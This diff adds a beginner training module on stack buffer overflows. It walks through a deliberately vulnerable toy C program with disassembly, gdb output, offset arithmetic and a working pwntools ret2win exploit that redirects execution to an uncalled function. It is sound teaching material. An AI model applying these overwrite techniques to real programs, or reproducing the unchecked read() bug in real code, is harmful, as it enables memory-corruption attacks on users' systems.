@@ -1,0 +1,592 @@
+name: Your First Memory Bug
+description: |
+  See how writing past a buffer can change nearby data or redirect a program to
+  a function it did not intend to call.
+
+  New to this? Open **Start here** below before the first challenge. Suggested
+  order: stack-overflow, bof-baseline, ret2win-64.
+challenges:
+  - id: stack-overflow
+    name: Change a Stack Variable
+  - id: bof-baseline
+    name: Return to win()
+  - id: ret2win-64
+    name: 64-bit Return to win()
+resources:
+  - name: "Start here: stack frames, overflows, and return addresses"
+    type: markdown
+    content: |
+      ## What this module is about
+
+      A C program keeps each function's local variables in a region of memory called the
+      **stack**. C does not check whether data fits where you put it, so a program that copies
+      too many bytes into an array writes over whatever sits next to it. That mistake is a
+      **buffer overflow**. In this module you use one to change a variable you were never
+      allowed to set, and then to make the program run a function nothing calls.
+
+      Almost every memory-corruption attack starts with this skill: read the disassembly, work
+      out where things sit relative to each other on the stack, and send exactly the right
+      bytes. The rest of the dojo (shellcode, format strings, defenses) builds on it.
+
+      ---
+
+      ## Concept 1: the stack and a stack frame
+
+      The **stack** is a region of memory that grows **downward**: each new item is placed at a
+      lower address than the one before. Three registers (small storage slots inside the CPU)
+      matter here:
+
+      - `rsp` (stack pointer) holds the address of the item most recently pushed: the "top" of
+        the stack, which is its lowest address.
+      - `rbp` (base pointer) holds a fixed spot inside the current function's area. The
+        function's variables are found relative to it.
+      - `rip` (instruction pointer) holds the address of the next instruction to run.
+
+      Each running function owns a slice of the stack called its **stack frame**. In the
+      programs in this module (compiled without optimization), a frame always looks like this:
+
+      ```
+      higher addresses
+        +---------------------------+
+        |  return address (8 bytes) |  [rbp+8]  where to continue after this function ends
+        +---------------------------+
+        |  saved rbp      (8 bytes) |  [rbp]    the caller's rbp, put back on the way out
+        +---------------------------+  <- rbp points here
+        |  other local variables    |  [rbp-0x4], [rbp-0x8], ...
+        +---------------------------+
+        |  unused gap (maybe)       |  the compiler may leave space between variables
+        +---------------------------+
+        |  buffer, e.g. char b[20]  |  [rbp-N]  starts at its LOWEST address
+        +---------------------------+  <- rsp is at or below here
+      lower addresses
+      ```
+
+      How the frame is built and taken apart, one instruction at a time:
+
+      |Instruction|Where|What it does to the stack|
+      |---|---|---|
+      |`call greet`|caller|pushes the address of the instruction after the `call` (the **return address**), then jumps to `greet`|
+      |`push rbp`|start of `greet`|saves the caller's `rbp` directly below the return address|
+      |`mov rbp,rsp`|start of `greet`|`rbp` now points at that saved `rbp`|
+      |`sub rsp,0x20`|start of `greet`|reserves 0x20 bytes below `rbp` for local variables|
+      |`leave`|end of `greet`|`rsp = rbp`, then pops the saved `rbp` back into `rbp`|
+      |`ret`|end of `greet`|pops 8 bytes from the stack into `rip`: the CPU continues at whatever address those 8 bytes hold|
+
+      `ret` does not check anything. It does not know or care where the 8 bytes came from.
+
+      ---
+
+      ## Concept 2: buffer overflow
+
+      A **buffer** is a fixed-size block of memory for data, usually an array such as
+      `char name[20]`. Input functions fill a buffer starting at its **lowest** address and
+      moving **up**. If they accept more bytes than the buffer holds, the extra bytes keep
+      going up the stack:
+
+      ```
+      higher addresses
+        return address     <- 4th: the bytes reach this last
+        saved rbp          <- 3rd
+        other locals       <- 2nd: overwritten next
+        buffer             <- 1st: your input starts here, at [rbp-N]
+      lower addresses
+      ```
+
+      How far each input function will write:
+
+      - `read(0, buf, count)` copies up to `count` bytes, whatever they are. A newline is one
+        more byte to it. If `count` is larger than the buffer, it can overflow.
+      - `scanf("%s", buf)` copies one word with no size limit. It stops at whitespace (space,
+        tab, newline and a few other line-break bytes), not at a zero byte.
+      - `gets` and `strcpy` have no size limit either; `strcpy` stops at a zero byte.
+
+      ---
+
+      ## Concept 3: overwriting a neighbouring variable
+
+      A variable has no protection of its own: it is a few bytes at a fixed position. If an
+      overflow reaches those bytes, the variable now holds whatever you wrote there. Any later
+      `if` that tests it sees your value. The program did not "decide" to trust you; it read
+      memory you overwrote.
+
+      ## Concept 4: the return address and `ret`
+
+      The saved return address is 8 bytes on the stack like any other. When the function
+      finishes, `ret` loads those 8 bytes into `rip`. If an overflow replaced them with the
+      address of another function, the CPU "returns" into that function. Programs in this
+      module contain a function called `win()` that prints the flag but is never called; this
+      technique is often named **ret2win** ("return to win").
+
+      ## Concept 5: little-endian
+
+      x86-64 is **little-endian**: a number bigger than one byte is stored **lowest byte
+      first**. Each pair of hex digits is one byte.
+
+      ```
+      the 8-byte number 0x00000000004011b6, in memory:
+
+      address:  +0   +1   +2   +3   +4   +5   +6   +7
+      byte:     b6   11   40   00   00   00   00   00
+                ^ lowest byte first
+      ```
+
+      So you cannot type an address into a program as text such as `4011b6`. You must send
+      the 8 raw bytes in this order. pwntools does the packing for you:
+
+      - `p64(value)` gives 8 little-endian bytes (for addresses and 8-byte variables).
+      - `p32(value)` gives 4 little-endian bytes (for 4-byte variables, shown as `DWORD`).
+      - Without pwntools: `struct.pack("<Q", value)` and `struct.pack("<I", value)`.
+
+      ---
+
+      ## Worked example: a toy program (not a challenge)
+
+      This program is not one of the challenges, and its numbers are different from every
+      challenge's. It has a buffer, a neighbouring variable, and a function nothing calls.
+
+      ```c
+      #include <stdio.h>
+      #include <stdlib.h>
+      #include <unistd.h>
+
+      void secret(void) {
+          puts("secret() ran, but nobody called it!");
+          exit(0);
+      }
+
+      void greet(void) {
+          long lucky = 7;
+          char name[20];
+          printf("What is your name? ");
+          fflush(stdout);
+          read(0, name, 100);              /* the bug: 100 bytes into a 20-byte buffer */
+          printf("Hi! Your lucky number is %ld (hex 0x%lx)\n", lucky, lucky);
+      }
+
+      int main(void) {
+          greet();
+          puts("Back in main. Bye!");
+          return 0;
+      }
+      ```
+
+      Built the way the challenges are built: no optimization, no stack canary, no PIE (these
+      are explained at the end):
+
+      ```
+      $ gcc -O0 -fno-stack-protector -no-pie toy.c -o toy
+      toy.c: In function 'greet':
+      toy.c:15:5: warning: 'read' writing 100 bytes into a region of size 20 overflows the destination [-Wstringop-overflow=]
+      ...
+      ```
+
+      (gcc noticed the bug and warned. It still built the program.)
+
+      All output in this example is real. Two conventions: `...` marks lines removed to keep it
+      short (warnings, gdb start-up messages, pwntools progress lines), and the tabs that tools
+      put between columns are shown as spaces.
+
+      ### Step 1: read greet() with objdump
+
+      ```
+      $ objdump -d -M intel toy
+      ...
+      00000000004011d7 <greet>:
+        4011d7:  f3 0f 1e fa            endbr64
+        4011db:  55                     push   rbp
+        4011dc:  48 89 e5               mov    rbp,rsp
+        4011df:  48 83 ec 20            sub    rsp,0x20
+        4011e3:  48 c7 45 f8 07 00 00   mov    QWORD PTR [rbp-0x8],0x7
+        4011ea:  00
+        4011eb:  48 8d 05 3a 0e 00 00   lea    rax,[rip+0xe3a]        # 40202c <_IO_stdin_used+0x2c>
+        4011f2:  48 89 c7               mov    rdi,rax
+        4011f5:  b8 00 00 00 00         mov    eax,0x0
+        4011fa:  e8 91 fe ff ff         call   401090 <printf@plt>
+        4011ff:  48 8b 05 32 2e 00 00   mov    rax,QWORD PTR [rip+0x2e32]        # 404038 <stdout@GLIBC_2.2.5>
+        401206:  48 89 c7               mov    rdi,rax
+        401209:  e8 a2 fe ff ff         call   4010b0 <fflush@plt>
+        40120e:  48 8d 45 e0            lea    rax,[rbp-0x20]
+        401212:  ba 64 00 00 00         mov    edx,0x64
+        401217:  48 89 c6               mov    rsi,rax
+        40121a:  bf 00 00 00 00         mov    edi,0x0
+        40121f:  e8 7c fe ff ff         call   4010a0 <read@plt>
+        401224:  48 8b 55 f8            mov    rdx,QWORD PTR [rbp-0x8]
+        401228:  48 8b 45 f8            mov    rax,QWORD PTR [rbp-0x8]
+        40122c:  48 89 c6               mov    rsi,rax
+        40122f:  48 8d 05 0a 0e 00 00   lea    rax,[rip+0xe0a]        # 402040 <_IO_stdin_used+0x40>
+        401236:  48 89 c7               mov    rdi,rax
+        401239:  b8 00 00 00 00         mov    eax,0x0
+        40123e:  e8 4d fe ff ff         call   401090 <printf@plt>
+        401243:  90                     nop
+        401244:  c9                     leave
+        401245:  c3                     ret
+      ```
+
+      Line by line, the parts that matter:
+
+      - `push rbp` / `mov rbp,rsp` / `sub rsp,0x20`: build the frame (Concept 1). 0x20 bytes
+        are reserved for locals.
+      - `mov QWORD PTR [rbp-0x8],0x7`: store 7 in an 8-byte (`QWORD`) slot at `rbp-0x8`. The
+        C line `long lucky = 7;` matches, so **`lucky` lives at `[rbp-0x8]`**. This
+        instruction is 8 bytes long; objdump printed its last byte (`00`) on the next line.
+      - `lea rax,[rbp-0x20]` ... `mov rsi,rax` ... `call read`: `read`'s second argument
+        (`rsi`) is where it writes. So **`name` starts at `[rbp-0x20]`**. `mov edx,0x64` is
+        the third argument: up to 0x64 = 100 bytes.
+      - `mov rdx,QWORD PTR [rbp-0x8]` after the call: `lucky` is read back for `printf`.
+      - `leave` / `ret`: take the frame apart and jump to the saved return address.
+
+      ### Step 2: draw the frame with the real numbers
+
+      ```
+      higher addresses
+        [rbp+0x8]   return address    8 bytes  (back into main)
+        [rbp]       saved rbp         8 bytes
+        [rbp-0x8]   lucky             8 bytes
+        [rbp-0xc]   unused gap        4 bytes
+        [rbp-0x20]  name[0..19]      20 bytes  <- read() starts writing here
+      lower addresses
+      ```
+
+      `name` was declared with 20 bytes, but the next variable starts 0x20 - 0x8 = 0x18 = 24
+      bytes above it. The compiler left a 4-byte gap. **Only the disassembly tells you the real
+      positions.**
+
+      ### Step 3: look at the frame in gdb
+
+      gdb can stop at `leave` (address `0x401244`) and show the frame. The input is the word
+      `Sam`, saved in a file first with `echo Sam > sam.txt`.
+
+      ```
+      $ gdb -q -nx -batch -ex 'break *0x401244' -ex 'run < sam.txt' -ex 'x/6gx $rbp-0x20' ./toy
+      Breakpoint 1 at 0x401244
+      ...
+      What is your name?
+      Breakpoint 1, 0x0000000000401244 in greet ()
+      0x7ffe5ea32600: 0x000000000a6d6153      0x0000000000000000
+      0x7ffe5ea32610: 0x0000000000000000      0x0000000000000007
+      0x7ffe5ea32620: 0x00007ffe5ea32630      0x0000000000401253
+      ```
+
+      `x/6gx $rbp-0x20` means "examine 6 **g**iant (8-byte) values, in he**x**, starting at
+      `rbp-0x20`". Each row is an address, then the 8-byte value at that address and the one 8
+      bytes after it. Reading the six values in order:
+
+      ```
+      rbp-0x20  0x000000000a6d6153   name[0..7]:  bytes 53 61 6d 0a = "Sam\n", shown backwards
+      rbp-0x18  0x0000000000000000   name[8..15]
+      rbp-0x10  0x0000000000000000   name[16..19] + the 4-byte gap
+      rbp-0x08  0x0000000000000007   lucky = 7
+      rbp       0x00007ffe5ea32630   saved rbp (main's rbp, a stack address)
+      rbp+0x08  0x0000000000401253   return address
+      ```
+
+      The first value is little-endian in action: `S`=0x53 is the first byte in memory but the
+      last pair of digits printed. And `0x401253` is the instruction in `main` right after
+      `call greet`:
+
+      ```
+      $ objdump -d -M intel toy | grep -A6 "<main>:"
+      0000000000401246 <main>:
+        ...
+        40124e:  e8 84 ff ff ff         call   4011d7 <greet>
+        401253:  48 8d 05 10 0e 00 00   lea    rax,[rip+0xe10]        # 40206a <_IO_stdin_used+0x6a>
+        ...
+      ```
+
+      ### Step 4: overwrite the neighbouring variable
+
+      Distance from the start of `name` to `lucky`: 0x20 - 0x8 = 24 bytes of filler, then 8
+      bytes for the new value. 1337 is 0x539:
+
+      ```
+      $ python3 -c 'import sys; sys.stdout.buffer.write(b"A"*24 + bytes([0x39,0x05,0,0,0,0,0,0]))' | ./toy
+      What is your name? Hi! Your lucky number is 1337 (hex 0x539)
+      Back in main. Bye!
+      ```
+
+      Using the declared size (20) instead of the real distance (24) puts the value in the
+      wrong place:
+
+      ```
+      $ python3 -c 'import sys; sys.stdout.buffer.write(b"A"*20 + bytes([0x39,0x05,0,0,0,0,0,0]))' | ./toy
+      What is your name? Hi! Your lucky number is 0 (hex 0x0)
+      Back in main. Bye!
+      ```
+
+      The `39 05` bytes landed in the gap, and the four zero bytes after them landed on the
+      low half of `lucky`.
+
+      `p64` builds the same 8 bytes:
+
+      ```
+      $ python3 -c "from pwn import *; print(p64(0x539)); print(p64(0x4011b6)); print(p32(0x539))"
+      b'9\x05\x00\x00\x00\x00\x00\x00'
+      b'\xb6\x11@\x00\x00\x00\x00\x00'
+      b'9\x05\x00\x00'
+      ```
+
+      Python prints a byte as a character when it has one: `9` is 0x39 and `@` is 0x40.
+
+      ### Step 5: find the distance to the return address with a cyclic pattern
+
+      From the drawing: 0x20 bytes of buffer and gap and `lucky`, plus 8 bytes of saved `rbp`
+      = 0x28 = 40 bytes before the return address. A **cyclic pattern** lets you check that
+      number by experiment. It is a string in which every 8-byte chunk is different, so any
+      8 bytes you find later tell you exactly where in the input they were.
+
+      ```
+      $ pwn cyclic -n 8 100 > pattern
+      $ cat pattern
+      aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
+      $ ./toy < pattern
+      What is your name? Hi! Your lucky number is 7016996765293437284 (hex 0x6161616161616164)
+      Segmentation fault (core dumped)
+      ```
+
+      Two clues. First, `lucky` now holds `0x6161616161616164`: the letters `daaaaaaa`, written
+      backwards because of little-endian. `pwn cyclic -n 8 -l 0x6161616161616164` prints `24`,
+      the same distance as Step 4. Second, the program crashed: something replaced the return
+      address too. Run it in gdb to see what. (In the gdb captures below, program output went
+      to a file, so the `Hi!` line is missing: the crash came before it was written out.)
+
+      ```
+      $ gdb -q -nx -batch -ex 'run < pattern' -ex 'x/i $rip' -ex 'info registers rip rsp rbp' -ex 'x/gx $rsp' ./toy
+      ...
+      Program received signal SIGSEGV, Segmentation fault.
+      0x0000000000401245 in greet ()
+      => 0x401245 <greet+110>:        ret
+      rip            0x401245            0x401245 <greet+110>
+      rsp            0x7ffd0ce44908      0x7ffd0ce44908
+      rbp            0x6161616161616165  0x6161616161616165
+      0x7ffd0ce44908: 0x6161616161616166
+      ```
+
+      ### The x86-64 wrinkle: the crash happens AT `ret`
+
+      Look closely: `rip` is **not** a pattern value. It is `0x401245`, the `ret` instruction
+      itself. Tutorials written for 32-bit programs show the pattern in the instruction
+      pointer; on x86-64 you usually will not see it there.
+
+      The reason: x86-64 addresses are 8 bytes, but the CPU only accepts addresses of a certain
+      shape (called **canonical**): roughly, the top two bytes must be `0000` or `ffff`. Here the
+      address would be `0x6161616161616166`, so `ret` faults **before** it changes `rip`, and gdb
+      reports the crash at the `ret`. The value `ret` tried to use is still sitting at the top
+      of the stack, so read it with `x/gx $rsp`. That is `0x6161616161616166`. (`rbp` holds the
+      pattern too: `leave` loaded it from the overwritten saved `rbp`.)
+
+      Ask pwntools where that value sits in the pattern:
+
+      ```
+      $ pwn cyclic -n 8 -l 0x6161616161616166
+      40
+      ```
+
+      40, the same as the drawing. pwndbg (what `gdb` loads by default here) has the same
+      command:
+
+      ```
+      $ gdb -q -batch -ex 'cyclic -n 8 -l 0x6161616161616166' ./toy
+      ...
+      Finding cyclic pattern of 8 bytes: b'faaaaaaa' (hex: 0x6661616161616161)
+      Found at offset 40
+      ```
+
+      A return address with a valid shape behaves differently: the `ret` succeeds and the crash
+      happens at the new address, so `rip` shows your value. The file `six` holds 40 bytes of
+      filler, then the 8 bytes `41 41 41 41 41 41 00 00`:
+
+      ```
+      $ python3 -c 'import sys; sys.stdout.buffer.write(b"A"*40 + bytes([0x41,0x41,0x41,0x41,0x41,0x41,0,0]))' > six
+      $ gdb -q -nx -batch -ex 'run < six' -ex 'info registers rip' ./toy
+      ...
+      Program received signal SIGSEGV, Segmentation fault.
+      0x0000414141414141 in ?? ()
+      rip            0x414141414141      0x414141414141
+      ```
+
+      ### Step 6: return into secret()
+
+      Find the address with `nm`, which lists named functions (`T` = code):
+
+      ```
+      $ nm toy | grep -E " (secret|greet|main)$"
+      00000000004011d7 T greet
+      0000000000401246 T main
+      00000000004011b6 T secret
+      ```
+
+      Then send 40 bytes of filler and the address, packed:
+
+      ```python
+      from pwn import *
+
+      secret = 0x4011b6                         # from: nm toy | grep secret
+      payload = b"A" * 40 + p64(secret)         # 0x20 + 8 = 40 bytes of filler
+
+      p = process("./toy")
+      p.send(payload)
+      print(p.recvall().decode(errors="replace"))
+      ```
+
+      ```
+      $ python3 exploit.py
+      [+] Starting local process './toy': pid 68
+      ...
+      [*] Process './toy' stopped with exit code 0 (pid 68)
+      ...
+      [+] Receiving all data: Done (125B)
+      What is your name? Hi! Your lucky number is 4702111234474983745 (hex 0x4141414141414141)
+      secret() ran, but nobody called it!
+      ```
+
+      `lucky` became `0x4141414141414141` because the filler ran over it on the way up (`A` is
+      0x41). Then `greet`'s `ret` jumped to `secret()`.
+
+      ---
+
+      ## The method, for any program in this module
+
+      1. Find the buffer: the `lea rax,[rbp-0x...]` whose result reaches the input call
+         (`read`, `scanf`, ...). Call that number **B**.
+      2. Find the target:
+         - a variable at `[rbp-D]`: filler = **B - D**;
+         - the return address at `[rbp+8]`: filler = **B + 8** (B bytes up to `rbp`, then
+           8 bytes of saved `rbp`).
+      3. Do the arithmetic in hex or convert first. `python3 -c "print(0x20 - 0x8, 0x20 + 8)"`
+         prints `24 40`.
+      4. Pack the value with `p32` (4-byte variable) or `p64` (8-byte variable or address).
+      5. Optional check: send a cyclic pattern, read the overwritten value in gdb (`x/gx $rsp`
+         after a crash at `ret`), and look it up with `cyclic -l`. Use the same `-n 8` for
+         making and looking up the pattern.
+
+      ## How to read the tool output
+
+      **objdump -d -M intel**, one line:
+
+      ```
+        40120e:  48 8d 45 e0            lea    rax,[rbp-0x20]
+        ^ address  ^ the instruction's     ^ the instruction, Intel style:
+                     raw bytes (hex)         destination first, then source
+      ```
+
+      - `[...]` means memory at that address. `[rbp-0x20]` is "the address `rbp` minus 0x20
+        (32)". `lea` computes that address without reading memory; `mov` with `[...]` reads or
+        writes the memory there.
+      - `BYTE`, `WORD`, `DWORD`, `QWORD PTR` = 1, 2, 4, 8 bytes.
+      - `call 4010a0 <read@plt>`: a call to the library function `read`.
+      - Everything after `#` is a comment objdump added, usually the address an instruction
+        refers to.
+
+      **gdb x/Ngx ADDRESS**: N values of 8 bytes, in hex, from ADDRESS. Each row starts with the
+      address of its first value. `x/Nwx` shows 4-byte values, `x/Nbx` single bytes (good for
+      seeing byte order), `x/s` a string, `x/i` an instruction.
+
+      **gdb at a crash**: the `in greet ()` line names the function where it stopped; the
+      `=>` line is the instruction that failed. If that instruction is `ret`, check `x/gx $rsp`.
+
+      **pwndbg**: when you run plain `gdb`, pwndbg also draws panels (registers, code, stack)
+      every time the program stops. The outputs above were captured with `gdb -nx` (pwndbg off)
+      to keep them short. The information is the same.
+
+      **Stack addresses change between runs** (`0x7ffe...` above). The program's own code
+      addresses (`0x401...`) do not, because these programs are built without PIE.
+
+      ---
+
+      ## Why there are no protections here
+
+      Real programs are usually built with **defenses** that make these bugs much harder to use.
+      This module's programs are built with them switched off so you can see the bug itself:
+
+      ```
+      $ pwn checksec toy
+      [*] '/w/toy'
+          Arch:       amd64-64-little
+          RELRO:      Partial RELRO
+          Stack:      No canary found
+          NX:         NX enabled
+          PIE:        No PIE (0x400000)
+          SHSTK:      Enabled
+          IBT:        Enabled
+          Stripped:   No
+      ```
+
+      - **No stack canary.** A canary is a secret value placed between the locals and the saved `rbp`. The
+        function checks it before `ret` and stops the program if it changed, so the overwrite
+        in Step 6 would be caught.
+      - **No PIE.** With PIE, the program's code (including `secret()` or `win()`) loads at a
+        different address every run, so the address from `nm` would be wrong.
+      - **NX** is on, but it does not matter here: you are only jumping to code already in the
+        program.
+      - SHSTK and IBT are markers for newer CPU protections that are not in force when these
+        programs run here; you can ignore those two lines.
+
+      Run `checksec --file=/challenge/<name>` on each challenge before you start. The **Binary
+      Defenses** module at the end of this dojo explains every line and what each defense
+      blocks.
+
+      ---
+
+      ## Glossary
+
+      - **Address**: the number that identifies a location in memory. Written in hex.
+      - **Hex** (hexadecimal): base 16, written with `0x`. `0x20` is 32, not 20.
+      - **Byte**: 8 bits; two hex digits. `DWORD` = 4 bytes, `QWORD` = 8 bytes.
+      - **Register**: a small storage slot inside the CPU (`rax`, `rsp`, `rbp`, `rip`, ...).
+      - **Stack**: the memory region holding local variables and return addresses; it grows
+        toward lower addresses.
+      - **Stack frame**: one function's slice of the stack.
+      - **rsp / rbp / rip**: the stack pointer, the base pointer of the current frame, and
+        the address of the next instruction.
+      - **Local variable**: a variable declared inside a function; it lives in that
+        function's frame.
+      - **Buffer**: a fixed-size block of memory for data, such as `char name[20]`.
+      - **Buffer overflow**: writing more bytes into a buffer than it holds.
+      - **Saved rbp**: the caller's `rbp`, stored at `[rbp]` and restored by `leave`.
+      - **Return address**: where execution continues after a function ends; stored at
+        `[rbp+8]`.
+      - **call / ret / leave / push / pop**: see the table in Concept 1.
+      - **Offset / distance / filler / padding**: the number of bytes from the start of your
+        input to the thing you want to overwrite, and the bytes you send to cover it.
+      - **Payload**: the exact bytes you send to the program.
+      - **Little-endian**: multi-byte numbers stored lowest byte first.
+      - **p32 / p64**: pwntools functions that pack a number into 4 or 8 little-endian bytes.
+      - **pwntools**: a Python library for talking to programs and building payloads.
+      - **Cyclic pattern**: input in which every chunk is unique, used to find an offset.
+      - **Segmentation fault (SIGSEGV)**: the crash a program gets for using memory it may not.
+      - **Canonical address**: an address of the shape x86-64 accepts (top two bytes `0000`
+        or `ffff`).
+      - **win() / ret2win**: a function that prints the flag; returning into it.
+      - **objdump / nm / gdb / pwndbg / checksec**: disassembler; symbol lister; debugger;
+        gdb add-on; defense reporter.
+      - **Stack canary / PIE / NX / ASLR**: defenses; see the section above and the Binary
+        Defenses module.
+
+      ## Common mistakes
+
+      - **Using the size from the C code or the prompt.** Use the `[rbp-0x...]` numbers. The
+        compiler adds gaps, as Step 2 showed.
+      - **Mixing hex and decimal.** `[rbp-0x40]` is 64 bytes, not 40. Let Python do the sums.
+      - **Forgetting the saved rbp.** The return address is at `B + 8`, not `B`.
+      - **Sending the address as text.** `"0x4011b6"` is 8 ASCII characters, not an address.
+        Use `p64`.
+      - **Packing the wrong size.** `p64` on a 4-byte variable writes 4 extra bytes past it;
+        `p32` for a return address leaves 4 of its 8 bytes unchanged.
+      - **A stray newline.** `echo` adds `\n` at the end. `read` stores it like any other
+        byte. Build input in Python and send exactly what you mean.
+      - **Expecting the pattern in `rip`.** On x86-64 the crash is usually at `ret`; look at
+        `x/gx $rsp`.
+      - **Different `-n` for making and looking up a pattern.** pwntools defaults to 4-byte
+        chunks; pwndbg uses 8 on x86-64. Pass `-n 8` both times.
+      - **Using someone else's numbers.** Each challenge has several versions with different
+        buffer sizes. Work from the binary in your own `/challenge`.
+
+      ## Where to go next
+
+      - The **Binary Defenses** module in this dojo: what changes when the protections are on.
+      - [pwn.college](https://pwn.college/): free courses; the Program Security material on
+        memory errors goes much deeper into this topic.
+      - [ir0nstone's binary exploitation notes](https://ir0nstone.gitbook.io/notes/): short
+        pages on ret2win, cyclic patterns, and the stack.
+      - [CTF 101: binary exploitation](https://ctf101.org/binary-exploitation/overview/):
+        a beginner overview of the same ideas.
